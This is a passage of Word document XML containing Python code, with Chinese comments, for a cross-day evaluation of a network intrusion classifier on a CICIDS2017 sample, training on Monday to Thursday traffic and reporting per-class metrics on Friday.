    <w:p w14:paraId="5696B50A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tree_method="hist",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5952A5EC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        verbosity=0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FED989">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        random_state=seed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC1AB4E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_jobs=-1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F92864">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732DEE59">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model.fit(X, y, sample_weight=balanced_weights(y))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A9878C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E104050">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0590093B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41F41D00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def per_class_rows(y_true, y_pred, names):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC2D331">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    labels = list(range(len(names)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="207E7EFD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    p, r, f, s = precision_recall_fscore_support(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66232ABE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        y_true, y_pred, labels=labels, average=None, zero_division=0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E01A169">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A574DA7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE35C3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        names[i]: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A948949">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "precision": round(float(p[i]), 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3561E9AB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "recall": round(float(r[i]), 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B6E212">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "f1": round(float(f[i]), 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BD8090">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "support": int(s[i]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B455A7C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43C0A9C6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for i in labels</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4781F81F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38359585">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F9944C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EA431D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3274F7FC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap = argparse.ArgumentParser(description="跨天留出评估（周一至周四训练，周五测试）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A10BC46">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--data", default="data/cicids2017_sample.csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3AA44A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--out", default="models/artifacts/cross_day.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261A8913">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--seed", type=int, default=42)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC8DAA8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    args = ap.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1AE00C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0483061C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y, feature_names, meta = load_dataset(args.data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38240A75">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if "__source__" not in meta.columns:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6286B5EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise SystemExit("样本缺 __source__ 列，用 tools/build_sample.py 重新生成")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD36866">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EC4BCAC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    days = meta["__source__"].map(day_of).to_numpy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B399D2A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    is_train = np.isin(days, TRAIN_DAYS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D481FAC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    is_test = days == TEST_DAY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03728214">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40EC43D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f"[切分] 训练日 {sorted(set(days[is_train]))} {is_train.sum()} 行 / "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B5EBDD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f"测试日 {TEST_DAY} {is_test.sum()} 行",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53182B1B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B27AFA4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2231EF17">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53C4D29D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for side, mask in (("训练侧", is_train), ("测试侧", is_test)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3604A0BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        dist = pd.Series(y[mask]).value_counts()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72871783">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"  {side}类别：" + "，".join(f"{k} {v}" for k, v in dist.items()), flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E42997">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25E99D0D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 标准化只在训练日上拟合，测试日自己是完全没见过的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C7B3E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    mean = X[is_train].mean(axis=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F110136">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    std = X[is_train].std(axis=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDE5005">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    std[std == 0] = 1.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B305A0C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    Xs = (X - mean) / std</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300D9AA7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42769D57">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out = {"train_days": list(TRAIN_DAYS), "test_day": TEST_DAY}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD5C694">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13F0C38A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ---------------------------------------------------------------- 实验 A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001C7F58">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 闭集：训练侧只有 BENIGN / DoS Hulk / Patator / Heartbleed 四类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A863326">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    a_classes = sorted(set(y[is_train]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52AC72C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
